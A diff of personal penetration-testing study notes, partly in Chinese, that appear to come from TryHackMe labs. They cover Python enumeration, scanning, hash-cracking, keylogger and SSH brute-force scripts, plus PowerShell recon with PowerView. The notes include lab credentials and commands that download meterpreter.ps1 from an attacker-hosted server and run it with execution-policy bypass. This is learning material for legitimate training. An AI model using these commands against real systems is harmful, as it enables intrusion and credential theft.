@@ -12,7 +12,7 @@
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 		--> cp /usr/share/wordlists/PythonForPentesters/wordlist2.txt wordlist2.txt 
 		
-		--> Subdomain Enumeration 子網域枚舉 
+### Subdomain Enumeration 子網域枚舉 
 			--> subdomains_0.py
 			--> /usr/share/wordlists/PythonForPentesters/wordlist2.txt
 			
@@ -20,8 +20,7 @@
 				=> python3 subdomains_0.py 10.10.9.230
 				
 				=> sub_domains = f"http://{sys.argv[1]}/{sub}" 
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		--> Directory Enumeration
+### Directory Enumeration
 			--> directory_0.py
 			
 			--> usage :
@@ -29,8 +28,7 @@
 				
 				=> 副檔名是.html
 				=> dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		--> Network Scanner
+###  Network Scanner
 			--> network_0.py
 			--> apt install python3-scapy
 			
@@ -39,8 +37,7 @@
 				
 				=> interface = "eth0" //網路介面
 				=> ip_range = "10.10.X.X/24"
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		--> Port Scanner
+### Port Scanner
 			--> sudo nmap -sS -T5 10.10.9.230 -p1-10000
 			
 			--> port_0.py
@@ -56,16 +53,14 @@
 				
 				=> ports = range(1, 65535) //all 
 				=> ports = { 21, 22, 23, 53, 80, 135, 443, 445} //指定
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		--> File Downloader
+###  File Downloader
 			--> same to Wget / Certutil (window)
 			--> file_0.py
 			
 			--> usage : 
 				=> url = 'https://assets.tryhackme.com/img/THMlogo.png'
 				=> open('THMlogo.png', 'wb').write(r.content)
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		--> Hash Cracker (md5)
+###  Hash Cracker (md5)
 			--> hash_0.py
 			--> usage : 
 				=> python3 hash_0.py
@@ -75,8 +70,7 @@
 				
 				=> hash_ob = hashlib.md5(line.strip().encode())
 				=> hash_ob = hashlib.sha256(line.strip().encode())
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		--> Keyloggers
+###  Keyloggers
 			--> keyloggers_0.py
 			--> sudo pip3 install keyboard
 			--> need root 
@@ -84,8 +78,7 @@
 			
 			--> usage : 
 				=> sudo python3 keyloggers_0.py
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		--> SSH Brute Forcing
+### SSH Brute Forcing
 			--> ssh_0.py
 			
 			--> ssh tiffany@10.10.9.230 | trustno1
@@ -102,7 +95,7 @@
 ## PowerShell
 	--> 使用 .NET 框架建構的 Windows 腳本語言和 shell 環境
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> PowerShell command : 
+###  PowerShell command : 
 	
 		--> commom verb : 
 			=> Get
@@ -113,8 +106,7 @@
 			=> New
 			=> Out
 			--> Get-New |取得新物件
-			
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+  ### Core command
 		--> Get-Command |列出指令的cmdlet 
 		--> Get-Help | 顯示有​​關cmdlet 的資訊
 			--> Get-Help Command-Name
@@ -185,8 +177,7 @@
 					--> show that :Directory: C:\Users\Administrator\Desktop
 			=> Get-Content C:\Users\Administrator\Desktop\b64.txt 		
 	
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		enumerate:
+### enumerate:
 			--> users
 				--> (Get-LocalUser).Name.Count
 				--> (Get-LocalUser | Select-Object * | Where-Object {$_.SID -eq "S-1-5-21-1394777289-3961777894-1791813945-501"}).Name
@@ -227,8 +218,7 @@
 				=> (Get-Acl -Path “C:\”).Owner
 			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Power Shell Scripting  : 
+###  Power Shell Scripting  : 
 		--> format : 
 			--> https://learnxinyminutes.com/docs/powershell/
 			
@@ -249,8 +239,7 @@
 	PowerShell for Pentesters : 
 		--> PowerSploit 或 Nishang (防毒軟體 can check)
 		--> ssh walter@10.10.210.144 | Kowacs123! => powershell
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> 操作文件 
+### 操作文件 
 		--> Start-Process : 可用於啟動進程
 			=> Start-Process notepad.exe
 	
@@ -270,8 +259,7 @@
 		--> Get-FileHash 
 			=> Get-FileHash -Algorithm MD5 .\aaa.txt
 			=> Get-FileHash -Algorithm SHA256 .\aaa.txt
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	-->下載文件
+### 下載文件
 		--> kali : python3 -m http.server 8888
 		--> PS :
 			--> (New-Object System.Net.WebClient).Downloadfile('http://10.11.92.230:8888/2024_5_CTF/PowerShell/meterpeter.ps1', 'meterpreter.ps1')
@@ -293,8 +281,7 @@
 			--> powershell -ExecutionPolicy Bypass -File .\meterpreter.ps1
 			--> Set-ExecutionPolicy Bypass -Scope Process (目前PowerShell會話)
 			
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> 系統偵察
+### 系統偵察
 		-->尋找遺失的修補程式(Patches)
 			--> Get-Hotfix
 			--> Get-Hotfix | Format-list | findstr instailedOn
@@ -302,14 +289,12 @@
 				=> findstr = grep 
 				=> Out-File aaa.txt 將輸出儲存到文件中
 				=> Out-Gridview -- 漂亮的GUI
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> 網路偵察
+###  網路偵察
 		-->  ping 從 10.0.2.1 到 10.0.2.15 的 IP 位址
 			=> 1..15 | %{echo "10.0.2.$_"}; ping -n 1 10.0.2.$_ | Select-String ttl
 		--> 掃描目標的前 1024 個TCP連接埠
 			=> 1..1024 | %{echo ((New-Object Net.Sockets.TcpClient),Connect("10.0.2.8", $_)) "Open port on - $_"} 2>null
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> PowerView
+###  PowerView
 		--> 收集域資訊最有效的方法之一
 		--> https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
 		--> https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
@@ -318,7 +303,7 @@
 			=> Set-ExecutionPolicy Bypass -Scope Process
 			=> Import-Module .\powerview.ps1
 	
-	--> GET-Info	
+###  GET-Info	
 		--> Get-NetDomainController : 將收集有關網域控制器的資訊
 			=> understand : IPAddress 
 			
@@ -348,8 +333,7 @@
 		--> Get-NetDomainTrus : 列出您可以存取的任何網域
 		
 		--> Find-LocalAdminAccess : 出您可以作為本機管理員存取的網域中的系統
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	Task : 
+### Task : 
 	--> find file : 
 		=> Get-ChildItem “*.ps1” -Path C:\Users\Walter\Desktop
 	--> MD5 
